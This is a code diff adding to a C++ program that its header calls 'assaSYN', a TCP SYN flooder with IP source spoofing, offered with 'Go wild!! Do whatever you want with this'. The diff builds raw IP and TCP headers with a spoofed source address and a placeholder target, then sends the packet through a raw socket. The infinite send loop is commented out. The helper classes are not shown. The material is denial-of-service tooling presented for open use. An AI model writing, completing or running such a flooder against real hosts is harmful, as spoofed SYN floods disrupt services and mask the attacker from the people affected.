@@ -1,4 +1,16 @@
-
+/*
+ * assaSYN - by wmax641
+ * Generic tcp syn flooder with spoofing
+ *
+ * Made as an example of how to send raw ip packets
+ *
+ * Go wild!! Do whatever you want with this
+ *
+ * Does NOT work on Windows, tested on a 64bit intel (little endian) machine. Have no
+ * idea what will happen on big endian systems, might need some tweaking
+ */
+#include <time.h>
+#include <stdlib.h>
 #include <iostream>
 
 #include <arpa/inet.h>
@@ -12,15 +24,21 @@
 
 int main(void) {
 
+   /* This will house the packet */
    char *buf = (char *)malloc(_DEFAULT_PACKET_BUFFER_LEN);
+
+   srand(time(NULL));
 
    try {
       /* Create custom ip packet */
       class IP_Hdr ip_hdr(buf);
-      ip_hdr.src_ip("111.111.111.111");
-      ip_hdr.dest_ip("222.222.222.222");
+      ip_hdr.init();
+      ip_hdr.src_ip("1.2.3.4"); /* If unset, your host ip will be used */
+      ip_hdr.dest_ip("13.37.13.37");
 
-      class TCP_Hdr tcp_hdr(buf + ip_hdr.hdr_len());
+      /* Add TCP onto same buffer */
+      class TCP_Hdr tcp_hdr(buf,  ip_hdr.hdr_len());
+      tcp_hdr.init();
 
       int sock;
 
@@ -37,10 +55,17 @@ int main(void) {
          return(1);
       }
 
-      if(sendto(sock, ip_hdr.get(), ip_hdr.hdr_len(), 0,
-                (struct sockaddr *)&dummy, (socklen_t)sizeof(dummy)) < 0) {
-         perror("error:");
-      }
+
+      /*   ^_^   */
+
+      //while(1) {
+         if(sendto(sock, 
+                   ip_hdr.get(), 
+                   ip_hdr.hdr_len() + tcp_hdr.hdr_len(), 
+                   0, (struct sockaddr *)&dummy, (socklen_t)sizeof(dummy))  < 0) {
+            perror("error:");
+         }
+      //}
 
    } catch (const char *e) {
       std::cerr << "Caught exception" << std::endl;
